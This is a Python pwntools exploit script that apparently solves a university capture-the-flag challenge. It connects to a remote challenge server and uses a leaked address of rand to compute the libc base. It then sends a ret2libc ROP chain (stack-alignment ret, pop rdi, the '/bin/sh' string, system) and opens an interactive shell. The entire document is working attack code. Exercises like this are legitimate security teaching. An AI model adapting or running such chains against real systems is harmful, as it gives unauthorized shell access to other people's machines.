from pwn import *

binary = 'chal.bin'
e = context.binary = ELF(binary, checksec=False)

libc = ELF('./libc6_2.28-0ubuntu1_amd64.so')                                                              # this is the libc version on the remote server
r = ROP(libc)
io = remote("cse4850-ret2libc-1.chals.io", 443, ssl=True, sni="cse4850-ret2libc-1.chals.io")

io.recvuntil(b'Random Value: ')
plt_val = int(io.recvline(), 16)                                # location of rand plt, recieved from commandline, converted to int from hex hence the 16
got_val = libc.sym['rand']                                                              # sym can find the value by name in the got, automatically an int
libc_base  = plt_val - got_val


print("The base address of libc is " + hex(libc_base))                                # check that address has 000 at end to make sure address is correct


chain = cyclic(16)
chain += p64(libc_base + r.find_gadget(['ret'])[0])                                                                             # 8 bytes to align stack
chain += p64(libc_base + r.find_gadget(['pop rdi','ret'])[0])                                              # returns list of gadgets [0] takes first one
chain += p64(libc_base + next(libc.search(b'/bin/sh\x00')))
chain += p64(libc_base + libc.sym['system'])

io.sendline(chain)
io.interactive()
